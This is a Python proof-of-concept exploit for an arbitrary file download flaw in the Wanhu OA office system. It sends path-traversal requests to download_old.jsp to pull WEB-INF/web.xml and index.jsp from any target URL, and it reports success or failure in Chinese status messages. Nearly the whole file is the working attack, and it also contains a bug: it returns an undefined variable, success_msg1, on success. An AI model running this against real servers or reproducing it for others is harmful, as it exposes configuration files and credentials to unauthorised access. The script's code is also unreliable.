import time
import requests
import urllib3
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

proxies={'http':'http://127.0.0.1:8080'}
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        }
    exp_url1 = target_url+"defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml"
    exp_url2 = target_url+'defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp'
    vuln=target_url+'defaultroot/download_old.jsp?path=..&name=x&FileName='
    success_msg = now_time() + '[SUCCESS]万户OA downloadold.jsp 任意文件下载漏洞存在'
    warning_msg = now_time() + '[WARNING]万户OA downloadold.jsp 任意文件下载漏洞不存在'
    error_msg = now_time() + '[万户OA downloadold.jsp 任意文件下载漏洞][ERROR]无法利用poc请求目标或被目标拒绝请求'
    try:
        requests.packages.urllib3.disable_warnings()
        respones1 = requests.get(exp_url1, headers=headers, verify=False)
        respones2 = requests.get(exp_url2, headers=headers, verify=False)
        shell_msg1 = now_time() + '{}'.format(exp_url1)
        shell_msg2 = now_time() + '{}'.format(exp_url2)
        if respones1.status_code == 200:
            return success_msg1, shell_msg1
        elif respones2.status_code == 200:
            return success_msg, shell_msg2
        else:
            return warning_msg
    except:
        return error_msg
